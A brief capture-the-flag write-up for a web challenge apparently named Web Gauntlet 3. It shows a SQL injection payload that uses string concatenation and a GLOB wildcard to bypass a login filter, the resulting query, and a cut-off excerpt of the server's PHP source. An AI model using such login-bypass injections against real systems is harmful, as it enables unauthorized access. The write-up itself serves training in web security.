## Solution
This is a follow-up for [Web Gauntlet 2](Web_Gauntlet_2.md), with a shorter character limit. Luckily, the payload we used for the previous challenge is short enough to be accepted here as well:
```
username: adm'||'in
password: ' glob '*
Full query:
SELECT username, password FROM users WHERE username='adm'||'in' AND password='' glob '*' 
```
We get the following response from the server:
```php
", "";
    }
} else if ($win === 1) {
    if ($view) {
        highlight_file("filter.php");
    }
    $_SESSION["winner3"] = 0;        // 
```
